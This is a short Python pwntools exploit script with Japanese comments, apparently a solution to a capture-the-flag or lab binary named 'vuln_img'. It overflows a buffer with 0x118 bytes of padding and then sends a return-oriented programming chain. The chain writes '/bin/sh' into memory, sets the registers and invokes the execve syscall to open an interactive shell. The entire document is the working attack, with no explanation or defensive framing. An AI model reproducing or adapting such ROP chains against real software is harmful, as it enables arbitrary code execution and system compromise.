from pwn import *

IMG_BASE = 0x1000000
DATA_ADDR = 0xfff200

io = process("./vuln_img")

# DATA_ADDRに"/bin/sh"を書き込む
payload =  p64(IMG_BASE + 0x23dc)  # pop rbx ; ret ;
payload += p64(DATA_ADDR)
payload += p64(IMG_BASE + 0x1fbf)  # pop rdx ; test  [rdi-0x73], esp ; ret ;
payload += b"/bin" + b'\x00' * 4
payload += p64(IMG_BASE + 0x494f)  # mov  [rbx], edx ; xchg byte [rdi+0x41], bl ; sbb eax, 0x4424A400 ; ret ;

payload += p64(IMG_BASE + 0x23dc)  # pop rbx ; ret ;
payload += p64(DATA_ADDR + 4)      # data addr
payload += p64(IMG_BASE + 0x1fbf)  # pop rdx ; test  [rdi-0x73], esp ; ret ;
payload += b"/sh" + b'\x00' * 5
payload += p64(IMG_BASE + 0x494f)  # mov  [rbx], edx ; xchg byte [rdi+0x41], bl ; sbb eax, 0x4424A400 ; ret ;

# execve("/bin/sh", NULL, NULL)
payload += p64(IMG_BASE + 0x4952)  # pop rdi ; sbb r8d, 0x4424A400 ; ret ;
payload += p64(DATA_ADDR)          # data addr

payload += p64(IMG_BASE + 0x771e)  # pop rcx ; ret ;
payload += p64(IMG_BASE + 0x58ba)  # pop rdx ; add eax, 0xD8A7D76F ; std ; ret ;
payload += p64(IMG_BASE + 0xbb60)  # pop rsi ; jmp rcx ;
payload += p64(0)                  # NULL
payload += p64(0)                  # NULL

payload += p64(IMG_BASE + 0xc30e)  # pop rax ; ret ;
payload += p64(0x3b)               # execve
payload += p64(IMG_BASE + 0xccb7)  # syscall

io.sendlineafter(b">", b"a" * 0x118 + payload)
io.sendlineafter(b">", b"exit")

io.interactive()